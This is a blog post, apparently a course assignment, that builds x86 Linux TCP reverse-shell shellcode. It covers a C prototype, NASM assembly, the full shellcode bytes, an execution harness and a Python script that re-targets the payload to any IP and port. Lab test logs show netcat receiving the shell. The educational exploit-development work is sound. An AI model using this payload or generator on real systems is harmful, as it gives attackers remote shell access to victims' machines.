---
layout: single
title: TCP reverse shellcode
date: 2018-11-18 12:00:00
classes: wide
header:
  teaser: /assets/images/slae32.png
categories:
  - slae
  - infosec
tags:
  - slae
  - assembly
  - tcp reverse shellcode
---

A TCP reverse shell connects back to the attacker machine, then executes a shell and redirects all input & output to the socket. This is especially useful when a firewall denies incoming connections but allows outgoing connections.

### C prototype
---------------
First, a C prototype is created to test the functionality before building the final shellcode in assembly.

This is the C protype used for the reverse shellcode:
```c
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    // Create addr struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);    // Port
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");  // Connection IP

    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        perror("Socket creation failed.\n");
        exit(EXIT_FAILURE);
    }

    // Connect socket
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
        perror("Socket connection failed.\n");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Duplicate stdin, stdout, stderr to socket
    dup2(sock, 0); //stdin
    dup2(sock, 1); //stdout
    dup2(sock, 2); //stderr

    //Execute shell
    execve("/bin/sh", NULL, NULL);
}
```

#### Testing the program

Compiling the C prototype:
```
slemire@slae:~/slae32/assignment2$ gcc -o shell_tcp_reverse_c shell_tcp_reverse.c
shell_tcp_reverse.c: In function ‘main’:
shell_tcp_reverse.c:13:25: warning: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
  addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Connection IP
                         ^
shell_tcp_reverse.c:35:2: warning: null argument where non-null required (argument 2) [-Wnonnull]
  execve("/bin/sh", 0, 0);
  ^
```

Netcat is used to listen for the reverse shell connection on port 4444:
```
slemire@slae:~/slae32/assignment2$ ./shell_tcp_reverse_c 
[...]
slemire@slae:~$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 52202)
whoami
slemire  
```

### Assembly version
--------------------
Similar to the bind shellcode, we first clear out the registers so there is nothing left in the upper or lower half that could cause problems with the program execution.

```nasm
; Zero registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

Next, a socket is created and we create the addr struct used to store the IP and port where the shellcode will connect to. In this example, the `127.0.0.1` IP is used with port `4444`. Later, we will use a python script to easily modify the IP address and port in the shellcode so we don't need to touch the assembly code manually every time we want to make a change. Depending on the IP address used, the shellcode generated might contain null bytes so instead the IP address is XORed with a specific key that won't result in null bytes in the shellcode.

```nasm
; Create socket
mov al, 0x66        ; sys_socketcall
mov bl, 0x1         ; SYS_SOCKET
push 0x6            ; int protocol -> IPPROTO_TCP
push 0x1            ; int type -> SOCK_STREAM
push 0x2            ; int domain -> AF_INET
mov ecx, esp
int 0x80            ; sys_socketcall (SYS_SOCKET)
mov edi, eax        ; save socket fd

; Create addr struct
mov eax, 0xfeffff80 ; 127.0.0.1 XORed
mov ebx, 0xffffffff ; XOR key (should be changed depending on IP to avoid nulls)
xor eax, ebx        ; 
push edx            ; NULL padding
push edx            ; NULL padding
push eax            ; sin.addr (127.0.0.1)
push word 0x5c11    ; Port 4444
push word 0x2       ; AF_INET
mov esi, esp
```

The reverse shellcode is simpler than a bind one since we only need to call `connect` and the server will initiate a connection to the attacker machine.

```nasm
; Connect socket
xor eax, eax
xor ebx, ebx
mov al, 0x66        ; sys_socketcall
mov bl, 0x3         ; SYS_CONNECT
push 0x10           ; socklen_t addrlen
push esi            ; const struct sockaddr *addr
push edi            ; int sockfd
mov ecx, esp
int 0x80
```

The same `dup2` function that is used with the bind shellcode is used here to redirect input & ouput then execute a shell with `execve`. The `/bin/bash`  string is pushed in reverse order on the stack but since the string needs to be null terminated, we will null out the `A` byte at offset `ESP + 11`.

```nasm
; Redirect STDIN, STDOUT, STDERR to socket
xor ecx, ecx
mov cl, 0x3         ; counter for loop (stdin to stderr)
mov ebx, edi        ; socket fd

dup2:
mov al, 0x3f        ; sys_dup2
dec ecx
int 0x80            ; sys_dup2
inc ecx
loop dup2

; execve()
xor eax, eax
push 0x41687361     ; ///bin/bashA
push 0x622f6e69
push 0x622f2f2f
mov byte [esp + 11], al
mov al, 0xb
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
``` 

The final shellcode looks like this:

```nasm
global _start

section .text

_start:

    ; Zero registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; Create socket
    mov al, 0x66        ; sys_socketcall
    mov bl, 0x1         ; SYS_SOCKET
    push 0x6            ; int protocol -> IPPROTO_TCP
    push 0x1            ; int type -> SOCK_STREAM
    push 0x2            ; int domain -> AF_INET
    mov ecx, esp
    int 0x80            ; sys_socketcall (SYS_SOCKET)
    mov edi, eax        ; save socket fd

    ; Create addr struct
    mov eax, 0xfeffff80 ; 127.0.0.1 XORed
    mov ebx, 0xffffffff ; XOR key (should be changed depending on IP to avoid nulls)
    xor eax, ebx        ; 
    push edx            ; NULL padding
    push edx            ; NULL padding
    push eax            ; sin.addr (127.0.0.1)
    push word 0x5c11    ; Port 4444
    push word 0x2       ; AF_INET
    mov esi, esp

    ; Connect socket
    xor eax, eax
    xor ebx, ebx
    mov al, 0x66        ; sys_socketcall
    mov bl, 0x3         ; SYS_CONNECT
    push 0x10           ; socklen_t addrlen
    push esi            ; const struct sockaddr *addr
    push edi            ; int sockfd
    mov ecx, esp
    int 0x80

    ; Redirect STDIN, STDOUT, STDERR to socket
    xor ecx, ecx
    mov cl, 0x3         ; counter for loop (stdin to stderr)
    mov ebx, edi        ; socket fd

    dup2:
    mov al, 0x3f        ; sys_dup2
    dec ecx
    int 0x80            ; sys_dup2
    inc ecx
    loop dup2

    ; execve()
    xor eax, eax
    push 0x41687361     ; ///bin/bashA
    push 0x622f6e69
    push 0x622f2f2f
    mov byte [esp + 11], al
    mov al, 0xb
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
```

Compiling and testing the NASM generated ELF file
```
slemire@slae:~/slae32/assignment2$ ../compile.sh shell_tcp_reverse
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Shellcode: \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb8\x80\xff\xff\xfe\xbb\xff\xff\xff\xff\x31\xd8\x52\x52\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
[+] Length: 109
[+] Done!

slemire@slae:~/slae32/assignment2$ file shell_tcp_reverse
shell_tcp_reverse: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped

slemire@slae:~/slae32/assignment2$ ./shell_tcp_reverse
[...]
slemire@slae:~$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 52204)
whoami
slemire
```

The shellcode is then tested with the skeleton program:
```c
#include <stdio.h>

char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb8\x80\xff\xff\xfe\xbb\xff\xff\xff\xff\x31\xd8\x52\x52\x50\x66\x68\x11\x5c\x66
\x6a\x02\x89\xe6\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x
2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

int main()
{
    int (*ret)() = (int(*)())shellcode;
    printf("Size: %d bytes.\n", sizeof(shellcode));
    ret();
}
```

Compiling and testing the shellcode:
```
slemire@slae:~/slae32/assignment2$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
slemire@slae:~/slae32/assignment2$ ./shellcode
[...]
slemire@slae:~$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 52212)
whoami
slemire
```

### Python script to modify IP and port
---------------------------------------

The following python script is used to modify the IP and port in the shellcode. It will automatically XOR the IP address with a key and make sure that the resulting shellcode doesn't contain any null bytes.

```python
#!/usr/bin/python

import socket
import struct
import sys

shellcode =  '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'
shellcode += '\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01'
shellcode += '\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7'
shellcode += '\\xb8\\x80\\xff\\xff\\xfe\\xbb\\xff\\xff'
shellcode += '\\xff\\xff\\x31\\xd8\\x52\\x52\\x50\\x66'
shellcode += '\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe6'
shellcode += '\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x03'
shellcode += '\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80'
shellcode += '\\x31\\xc9\\xb1\\x03\\x89\\xfb\\xb0\\x3f'
shellcode += '\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0'
shellcode += '\\x68\\x61\\x73\\x68\\x41\\x68\\x69\\x6e'
shellcode += '\\x2f\\x62\\x68\\x2f\\x2f\\x2f\\x62\\x88'
shellcode += '\\x44\\x24\\x0b\\xb0\\x0b\\x89\\xe3\\x31'
shellcode += '\\xc9\\x31\\xd2\\xcd\\x80'

if len(sys.argv) < 3:
        print('Usage: {name} [ip] [port]'.format(name = sys.argv[0]))
        exit(1)

ip = sys.argv[1]
port = sys.argv[2]
port_htons = hex(socket.htons(int(port)))

byte1 = port_htons[4:]
if byte1 == '':
        byte1 = '0'
byte2 = port_htons[2:4]

ip_bytes = []
xor_bytes = []

ip_bytes.append(hex(struct.unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][-2:])
ip_bytes.append(hex(struct.unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][-4:-2])
ip_bytes.append(hex(struct.unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][-6:-4])
ip_bytes.append(hex(struct.unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][:-6])

for b in range(0, 4):
        for k in range(1, 255):
                if int(ip_bytes[b], 16) ^ k != 0: # Make sure there is no null byte
                        ip_bytes[b] = hex(int(ip_bytes[b], 16) ^ k)[2:]
                        xor_bytes.append(hex(k)[2:])
                        break

# Replace port
shellcode = shellcode.replace('\\x11\\x5c', '\\x{}\\x{}'.format(byte1, byte2))

# Replace encoded IP
shellcode = shellcode.replace('\\x80\\xff\\xff\\xfe', '\\x{}\\x{}\\x{}\\x{}'.format(ip_bytes[3], ip_bytes[2], ip_bytes[1], ip_bytes[0]))

# Replace XOR key
shellcode = shellcode.replace('\\xff\\xff\\xff\\xff', '\\x{}\\x{}\\x{}\\x{}'.format(xor_bytes[3], xor_bytes[2], xor_bytes[1], xor_bytes[0]))

print('Here\'s the shellcode using IP {ip} and port {port}:'.format(ip = ip, port = port))
print(shellcode)

if '\\x0\\' in shellcode or '\\x00\\' in shellcode:
        print('##################################')
        print('Warning: Null byte in shellcode!')
        print('##################################')
```

To test, the IP address 172.23.10.37 is used with the port 5555:
```
slemire@slae:~/slae32/assignment2$ ./prepare.py 172.23.10.37 5555
Here's the shellcode using IP 172.23.10.37 and port 5555:
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb8\xad\x16\xb\x24\xbb\x1\x1\x1\x1\x31\xd8\x52\x52\x50\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
```

Finally, the shellcode is tested:
```
slemire@slae:~/slae32/assignment2$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
slemire@slae:~/slae32/assignment2$ ./shellcode
[...]
slemire@slae:~$ nc -lvnp 5555
Listening on [0.0.0.0] (family 0, port 5555)
Connection from [172.23.10.37] port 5555 [tcp/*] accepted (family 2, sport 58584)
whoami
slemire
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1236

All source files can be found on GitHub at [https://github.com/slemire/slae32](https://github.com/slemire/slae32)